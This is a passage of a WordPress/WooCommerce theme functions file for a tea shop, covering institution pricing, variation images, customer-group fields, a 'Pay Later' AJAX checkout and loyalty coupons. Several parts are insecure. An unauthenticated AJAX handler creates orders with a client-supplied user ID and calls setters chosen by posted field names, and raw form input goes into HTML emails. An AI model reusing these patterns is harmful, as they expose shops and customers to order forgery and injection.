        $userGroup = get_post_meta( $user->ID, 'group_id', true);
        
        if($userGroup == 4)
        {
            $pricex = get_post_meta( $variation->variation_id, 'institution_price', true);
    
            if($pricex !== '')
            {
                return $pricex;
            }
            else
            {
                return $price;    
            }
        }
        else
        {
            return $price;    
        }
    }
    else
    {
        return $price;    
    }
} */
/* end */

/* simple_institution_price for simple products */
add_filter('woocommerce_product_get_price', 'custom_price' , 99, 2 );
add_filter('woocommerce_product_get_regular_price', 'custom_price', 99, 2 );

function custom_price( $price, $product ) 
{
    if(is_user_logged_in())
    {
		$user = $user ? new WP_User( $user ) : wp_get_current_user();
        $userGroup = get_user_meta( $user->ID, 'group_id', true);
		
        
        if($userGroup == 4)
        {
            $pricex = get_post_meta( $product->get_id(), 'simple_institution_price', true);
    
            if($pricex !== '')
            {
                return $pricex;
            }
            else
            {
                return $price;    
            }
        }
        else
        {
            return $price;    
        } 
    }
    else
    {
        return $price;    
    }
}

/* end */

/* on change select variants - weight for this case */
add_action( 'wp_footer', 'show_variation_image' );

function show_variation_image()
{
	if(is_product()){				
	?>
		<script>
		jQuery(document).on('change', 'select#pa_weight', function() {
			if( $( "select#pa_weight option:selected" ).val() === '' )
			{
				// hide variation product image
				$( '.product-variation-images' ).css( 'display', 'none' );
				$( '.woocommerce-product-gallery__wrapper' ).css( 'display', 'block' );
			}
			else
			{		
				var value = "";
			
				// get the option that has been selected
				value += ".product-variation-" + $( "select#pa_weight option:selected" ).val();
			
				// Hide all custom_variation divs
				$( '.product-variation-images .product-variation-image').css( 'display', 'none' );
				
				// Display only the variation image which matches the criteria + hide default product image
				$( '.woocommerce-product-gallery__wrapper' ).css( 'display', 'none' );
				$( '.product-variation-images' ).css( 'display', 'block' );
				$( '.product-variation-images ' + value ).css( 'display', 'block' );
			}        
		});
		
		jQuery(document).on('change', 'select#pa_teabag-pieces', function() {
			if( $( "select#pa_teabag-pieces option:selected" ).val() === '' )
			{
				// hide variation product image
				$( '.product-variation-images' ).css( 'display', 'none' );
				$( '.woocommerce-product-gallery__wrapper' ).css( 'display', 'block' );
			}
			else
			{		
				var value = "";
			
				// get the option that has been selected
				value += ".product-variation-" + $( "select#pa_teabag-pieces option:selected" ).val();
				console.log(value);
				// Hide all custom_variation divs
				$( '.product-variation-images .product-variation-image').css( 'display', 'none' );
				
				// Display only the variation image which matches the criteria + hide default product image
				$( '.woocommerce-product-gallery__wrapper' ).css( 'display', 'none' );
				$( '.product-variation-images' ).css( 'display', 'block' );
				$( '.product-variation-images ' + value ).css( 'display', 'block' );
			}        
		});
		</script>
	<?php
	}
}
/* end */

/* gold points logic - after complete purchase */
/*
add_action( 'woocommerce_payment_complete', 'so_payment_complete' );

function so_payment_complete( $order_id )
{
    $order = wc_get_order( $order_id );
	
    $user = $order->get_user();
	
    // if( $user )
	// {
        $emailTo = 'harunthuo4@gmail.com';
		
		$subject = 'kericho after payment hook';
		
		$body = 'after hook';
		
		// $body = print_r($order, true);
		
		wp_mail($emailTo, $subject, $body);
    // }
}*/
/* end */

add_action('woocommerce_payment_complete', 'custom_process_order', 10, 1);
function custom_process_order($order_id) {
    $order = new WC_Order( $order_id );
    $myuser_id = (int)$order->user_id;
    $user_info = get_userdata($myuser_id);
    $items = $order->get_items();
	
	$emailTo = 'harunthuo4@gmail.com';
		
		$subject = 'kericho after payment hook';
		
		$body = 'after hook';
		
		// $body = print_r($order, true);
		
		wp_mail($emailTo, $subject, $body);
		
    foreach ($items as $item) {
        if ($item['product_id']==24) {
          // Do something clever
        }
    }
    return $order_id;
}


//Add an out of stock overlay to product images when all variations are unavailable
add_action( 'woocommerce_before_shop_loop_item_title', function() {
global $product;
if ( !$product->is_in_stock() ) {
echo '<span class="sold-out-overlay">Sold Out</span>';
}
});


add_action( 'user_new_form', 'extra_user_profile_fields' );
add_action( 'show_user_profile', 'extra_user_profile_fields' );
add_action( 'edit_user_profile', 'extra_user_profile_fields' );

function extra_user_profile_fields( $user ) { ?>
    <h3><?php _e("Extra Customer Information", "blank"); ?></h3>

    <table class="form-table">
    <tr>
        <th><label for="group_id"><?php _e("Customer Group"); ?></label></th>
        <td>
            <select name="group_id" id="group_id">
				<option value="1" <?php echo esc_attr( get_the_author_meta( 'group_id', $user->ID ) ) == 1 ? 'selected' : ''; ?> >Consumer</option>
				<option value="4" <?php echo esc_attr( get_the_author_meta( 'group_id', $user->ID ) ) == 4 ? 'selected' : ''; ?> >Institution</option>				
			</select>
            
        </td>
    </tr>
    </table>
<?php }



add_action( 'user_register', 'save_extra_user_profile_fields' );
add_action( 'personal_options_update', 'save_extra_user_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_user_profile_fields' );

function save_extra_user_profile_fields( $user_id ) {
    if ( !current_user_can( 'edit_user', $user_id ) ) { 
        return false; 
    }
	if ( isset( $_POST['group_id'] ))
    {
		if( $_POST['group_id'] == 4 )
		{
			
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
						
					
			$customerMessage = "<h3>Hello " . $_POST['billing_first_name'] . ' '. $_POST['billing_last_name'].",</h3>" . "<p> We have reviewed your business details and verified that they are valid. We have therefore approved you as an Institution customer.</p> <p>This means that you can now view Institution prices on the Shop. </p>";
			
			wp_mail($_POST['billing_email'], "Kericho Gold - Verification as an Institution Customer", $customerMessage, $headers);
		}
		
		update_user_meta( $user_id, 'group_id', $_POST['group_id'] );
	}
}

/* 11-july-2019 */
/* customer type selection */
add_action( 'wp_footer', 'customer_type' );
 
function customer_type() 
{
    if ( is_page( 'login' ) ) 
	{
        ?>
        <script type="text/javascript">  
		jQuery(document).ready(function(){
            jQuery(document).on('ifChecked','input[name=group_id]',function(e){
				if( e.target.value == 4 )
				{
					jQuery(document).find('.business-details').css({'display':'block'});
					jQuery(document).find('.business-details input[type=text]').attr('required', true);				
				}
				if( e.target.value == 1 )
				{
					jQuery(document).find('.business-details input[type=text]').attr('value', '');
					jQuery(document).find('.business-details input[type=text]').removeAttr('required');
					jQuery(document).find('.business-details').css({'display':'none'});
				}
				
				jQuery(document).find('#reg_billing_phone').attr('required', true);
				jQuery(document).find('#reg_billing_first_name').attr('required', true);
				jQuery(document).find('#reg_billing_last_name').attr('required', true);
				jQuery(document).find('#reg_username').attr('required', true);
				jQuery(document).find('#reg_email').attr('required', true);
				jQuery(document).find('#reg_password').attr('required', true);
			});
        });        
        </script>  
        <?php
    }
}
/* end */

add_action( 'woocommerce_review_order_before_payment', 'checkout_options' );
 
function checkout_options() 
{
   $args = array(
	   'type' => 'radio',
	   'class' => array( 'form-row-wide' ),
	   'options' => array(
		  'option_1' => 'Pay Now',
		  'option_2' => 'Pay Later',
	   )
   );
    
   echo '<div id="checkout-radio">';
   echo '<h3>Please select from the options below:</h3>';
   woocommerce_form_field( 'radio_choice', $args );
   echo '</div>';
}

add_action('wp_footer', 'pay_later_script' );
function pay_later_script() 
{
    // Only on Checkout
    if( is_checkout() && ! is_wc_endpoint_url() ) :
    ?>
    <script type="text/javascript">
    jQuery(function($){
        if (typeof wc_checkout_params === 'undefined') 
            return false;

        $(document.body).on("click", "#save_order" ,function(evt) {
            evt.preventDefault();
		
            $.ajax({
                type:    'POST',
                url: wc_checkout_params.ajax_url,
                contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                enctype: 'multipart/form-data',
				beforeSend: function() {
					$("#save_order").html('Please wait..').css({'opacity':'0.4'});
				},
                data: {
                    'action': 'ajax_order',
                    'fields': $('form.checkout').serializeArray(),
                    'user_id': <?php echo get_current_user_id(); ?>,
                },
                success: function (result) {
					$('body').trigger('update_checkout');   
					console.log(result);
					if( result != 0 ) 
					{
						var responseData = JSON.parse(''+result+'');
						
						window.location.href = responseData.redirect;
					}
                },
                error:   function(error) {
                    
                }
            });	
			
        });
    });
    </script>
    <?php
    endif;
}

add_action('wp_footer', 'alert_close' );
function alert_close() 
{
    ?>
    <script type="text/javascript">
    jQuery(function($){
        $(document.body).on("click", ".close-alert" ,function(evt) {
            evt.preventDefault();
		
            $(document.body).find('.alert-message').remove();			
        });
    });
    </script>
    <?php
}

add_action('wp_ajax_ajax_order', 'submited_ajax_order_data');
add_action( 'wp_ajax_nopriv_ajax_order', 'submited_ajax_order_data' );
function submited_ajax_order_data() 
{
	if( isset($_POST['fields']) && ! empty($_POST['fields']) ) 
	{
        $order    = new WC_Order();
        $cart     = WC()->cart;
        $checkout = WC()->checkout;
        $data     = [];

        foreach( $_POST['fields'] as $values )
		{
            $data[$values['name']] = $values['value'];
        }

        $cart_hash = md5( json_encode( wc_clean( $cart->get_cart_for_session() ) ) . $cart->total );
        $available_gateways = WC()->payment_gateways->get_available_payment_gateways();

        foreach ( $data as $key => $value ) 
		{
            if ( is_callable( array( $order, "set_{$key}" ) ) ) 
			{
                $order->{"set_{$key}"}( $value );
            } 
			elseif ( ( 0 === stripos( $key, 'billing_' ) || 0 === stripos( $key, 'shipping_' ) )
                && ! in_array( $key, array( 'shipping_method', 'shipping_total', 'shipping_tax' ) ) ) 
			{
                $order->update_meta_data( '_' . $key, $value );
            }
        }
		
		if( empty( $data['shipping_location'] ) || empty( $data['billing_first_name'] ) || empty( $data['billing_last_name'] ) || empty( $data['billing_country'] ) || empty( $data['billing_address_1'] ) || empty( $data['billing_city'] ) || empty( $data['billing_phone'] ) || empty( $data['billing_email'] ) || empty( $data['terms'] ) ):
		
			$errors = '';
		
			if( empty( $data['shipping_location'] ) )
			{
				$errors .=  wc_add_notice( 'Please enter your location.', 'error' );
			}
			if( empty( $data['billing_first_name'] ) )
			{
				$errors .= wc_add_notice( 'Billing First name is a required field.', 'error' );
			}
			if( empty( $data['billing_last_name'] ) )
			{
				$errors .= wc_add_notice( 'Billing Last name is a required field.', 'error' );
			}
			if( empty( $data['billing_country'] ) )
			{
				$errors .= wc_add_notice( 'Billing country is a required field.', 'error' );
			}
			if( empty( $data['billing_address_1'] ) )
			{
				$errors .= wc_add_notice( 'Billing Street address is a required field.', 'error' );
			}
			if( empty( $data['billing_city'] ) )
			{
				$errors .= wc_add_notice( 'Billing Town / City is a required field.', 'error' );
			}
			if( empty( $data['billing_phone'] ) )
			{
				$errors .= wc_add_notice( 'Billing Phone is a required field.', 'error' );
			}
			if( empty( $data['billing_email'] ) )
			{
				$errors .= wc_add_notice( 'Billing Email is a required field.', 'error' );
			}
			if( empty( $data['terms'] ) )
			{
				$errors .= wc_add_notice( 'Please read and accept the terms and conditions to proceed with your order.', 'error' );
			}
			
			return $errors;
		endif;
	
        $order->set_created_via( 'checkout' );
        $order->set_cart_hash( $cart_hash );
        $order->set_customer_id( apply_filters( 'woocommerce_checkout_customer_id', isset($_POST['user_id']) ? $_POST['user_id'] : '' ) );
        $order->set_currency( get_woocommerce_currency() );
        $order->set_prices_include_tax( 'yes' === get_option( 'woocommerce_prices_include_tax' ) );
        $order->set_customer_ip_address( WC_Geolocation::get_ip_address() );
        $order->set_customer_user_agent( wc_get_user_agent() );
        $order->set_customer_note( isset( $data['order_comments'] ) ? $data['order_comments'] : '' );
		
        $order->set_payment_method( isset( $available_gateways[ $data['payment_method'] ] ) ? $available_gateways[ $data['payment_method'] ]  : $data['payment_method'] );
		
        $order->set_shipping_total( $cart->get_shipping_total() );
        $order->set_discount_total( $cart->get_discount_total() );
        $order->set_discount_tax( $cart->get_discount_tax() );
        $order->set_cart_tax( $cart->get_cart_contents_tax() + $cart->get_fee_tax() );
        $order->set_shipping_tax( $cart->get_shipping_tax() );
        $order->set_total( $cart->get_total( 'edit' ) );

        $checkout->create_order_line_items( $order, $cart );
        $checkout->create_order_fee_lines( $order, $cart );
        $checkout->create_order_shipping_lines( $order, WC()->session->get( 'chosen_shipping_methods' ), WC()->shipping->get_packages() );
        $checkout->create_order_tax_lines( $order, $cart );
        $checkout->create_order_coupon_lines( $order, $cart );


        do_action( 'woocommerce_checkout_create_order', $order, $data );

        $order_id = $order->save();
		
		$orderNote = wc_get_order(  $order_id );
		$note = __("This is a 'Pay Later' order");
		$orderNote->add_order_note( $note );

        do_action( 'woocommerce_checkout_update_order_meta', $order_id, $data );

		WC()->mailer()->get_emails()['WC_Email_New_Order']->trigger( $order_id );
        WC()->mailer()->get_emails()['WC_Email_Customer_Invoice']->trigger( $order_id );
								
		echo json_encode(array( 'redirect' => home_url( '/my-account/orders/?success=1' )   ));
		
		WC()->cart->empty_cart();
    }
	
    die();
}

/* New order notification only for "Pending" Order status */
add_action( 'woocommerce_checkout_order_processed', 'pending_new_order_notification', 20, 1 );
function pending_new_order_notification( $order_id ) {

    // Get an instance of the WC_Order object
    $order = wc_get_order( $order_id );
	
	if( $order->get_created_via() == 'checkout' && $order->has_status( 'pending' ) )
	{
		WC()->mailer()->get_emails()['WC_Email_New_Order']->trigger( $order_id );
	}
    
}
/* end */

/* Exclude products from baraka-chai on the shop page */
function custom_pre_get_posts_query( $q ) 
{	
	$tax_query = (array) $q->get( 'tax_query' );

	$tax_query[] = array(
		   'taxonomy' => 'product_cat',
		   'field' => 'slug',
		   'terms' => array( 'baraka-chai' ), 
		   'operator' => 'NOT IN'
	);

	$q->set( 'tax_query', $tax_query );	
}
add_action( 'woocommerce_product_query', 'custom_pre_get_posts_query' );
/* end */

/* gold points logic - after complete purchase */
add_action( 'woocommerce_thankyou', 'gold_points_logic', 1 ); 
function gold_points_logic ( $order_id )
{     
	global $wpdb;
	
    $order = wc_get_order( $order_id );
	
	if( $order->get_created_via() == 'checkout' && $order->has_status( 'processing' ) && count($order->get_used_coupons()) == 0 )
	{
		$user = $order->get_user();			
		
		$productTotal = number_format( (float) $order->get_subtotal() + $order->get_total_tax(), wc_get_price_decimals(), '.', '' );
		
		$pointsEarned = round($productTotal/100);	
		$coupon_amount = round($pointsEarned*1.5);				
		
		$wpdb->insert('gold_points', 
			array(
			  'customer_id'    => $order->get_user_id(),
			  'order_id'       => $order_id,
			  'products_total' => $productTotal,
			  'points_earned'  => $pointsEarned,
			  'coupon_code'    => 'KEGO'.$order_id,
			  'coupon_amount'  => $coupon_amount,
			  'status'         => 0,
			  'created_at'     => date("Y-m-d H:i:s"),
			),
			array(
			  '%d',
			  '%d',
			  '%f',
			  '%d',
			  '%s',
			  '%d',
			  '%d',
			  '%s'
			) 
		);
		
		/* coupon start */
		$coupon_code = 'KEGO'.$order_id;
		$discount_type = 'fixed_cart';
							
		$coupon = array(
			'post_title' => $coupon_code,
			'post_content' => '',
			'post_status' => 'publish',
			'post_author' => 1,
			'post_type'		=> 'shop_coupon'
		);
							
		$new_coupon_id = wp_insert_post( $coupon );
							
		update_post_meta( $new_coupon_id, 'discount_type', $discount_type );
		update_post_meta( $new_coupon_id, 'coupon_amount', $coupon_amount );
		update_post_meta( $new_coupon_id, 'individual_use', 'yes' );
		update_post_meta( $new_coupon_id, 'product_ids', '' );
		update_post_meta( $new_coupon_id, 'exclude_product_ids', '' );
		update_post_meta( $new_coupon_id, 'usage_limit', 1 );
		update_post_meta( $new_coupon_id, 'expiry_date', '' );
		update_post_meta( $new_coupon_id, 'apply_before_tax', 'no' );
		update_post_meta( $new_coupon_id, 'free_shipping', 'no' );
		/* end */
	}       
}
/* end */